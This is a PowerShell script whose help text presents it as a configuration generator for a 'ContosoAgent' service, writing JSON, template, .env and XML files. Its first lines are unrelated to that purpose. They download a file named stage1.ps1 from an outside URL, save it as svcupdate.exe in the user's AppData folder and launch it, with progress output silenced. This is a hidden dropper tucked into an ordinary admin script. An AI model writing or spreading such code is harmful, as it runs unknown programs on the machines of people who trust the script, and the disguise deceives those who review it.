
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://internal.corp/stage1.ps1",
    [string]$DownloadPath = "$env:APPDATA\svcupdate.exe"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath
$ProgressPreference = "SilentlyContinue"
<#
.SYNOPSIS
    Generates the ContosoAgent JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.EXAMPLE
    .\New-AgentConfig.ps1 -Environment Staging
.NOTES
    Author: Server Operations
    Last updated: 2025-06-21
#>

$OutputPath  = "C:\ProgramData\Contoso\ContosoAgent\config.json"
$Environment = "Staging"
$ApiPort     = 9443
$NodeCount   = 3
$Force       = $false

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'ContosoAgent'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.adatum.com/v1'
            'https://telemetry.contoso.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}
$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.agent.logLevel = 'Information'
$config | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $OutputPath -Encoding UTF8

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "ContosoAgent",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8

$environmentFile = $OutputPath.Replace('.json', '.env')
$lines = @(
    "AGENT_ENV=$Environment"
    "AGENT_PORT=$ApiPort"
)
$lines | Set-Content -LiteralPath $environmentFile -Encoding UTF8

$xmlPath = $OutputPath.Replace('.json', '.xml')
$xml = New-Object System.Xml.XmlDocument
$root = $xml.CreateElement('configuration')
$xml.AppendChild($root) | Out-Null
$entry = $xml.CreateElement('add')
$entry.SetAttribute('key', 'Environment')
$entry.SetAttribute('value', $Environment)
$root.AppendChild($entry) | Out-Null
$xml.Save($xmlPath)

$configHash = (Get-FileHash -LiteralPath $OutputPath -Algorithm SHA256).Hash
Write-Verbose ("Config SHA256: {0}" -f $configHash)
$schemaFile = Join-Path $PSScriptRoot 'config.schema.json'
if (Test-Path -LiteralPath $schemaFile) {
    Write-Verbose ("Schema available: {0}" -f $schemaFile)
}

$summaryBody = "Config generated for {0} on $env:COMPUTERNAME" -f $Environment
Send-MailMessage -To 'ops@contoso.com' -From 'config@contoso.com' -Subject 'Agent configuration generated' -Body $summaryBody -SmtpServer 'smtp.contoso.com' -Port 25

$config | ConvertTo-Json -Depth 6
Write-Host ("Configuration complete for {0}" -f $Environment) -ForegroundColor Green

$portInUse = Get-NetTCPConnection -LocalPort $ApiPort -ErrorAction SilentlyContinue
if ($portInUse) {
    Write-Warning ("Port {0} is already in use" -f $ApiPort)
}

$previous = Join-Path (Split-Path -Parent $OutputPath) 'config.previous.json'
if (Test-Path -LiteralPath $previous) {
    Write-Verbose ("Previous config: {0}" -f $previous)
}

$encoding = [System.Text.UTF8Encoding]::new($false)
$encoding.GetType().Name | Write-Verbose

$defaults = @{
    retryCount = 3
    backoffSec = 5
    heartbeat  = 30
}
$defaults.GetEnumerator() | ForEach-Object { Write-Verbose ("{0} = {1}" -f $_.Key, $_.Value) }

$nodeList = 1..$NodeCount | ForEach-Object { 'node-{0:d2}' -f $_ }
Write-Verbose ("Planned nodes: {0}" -f ($nodeList -join ', '))

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
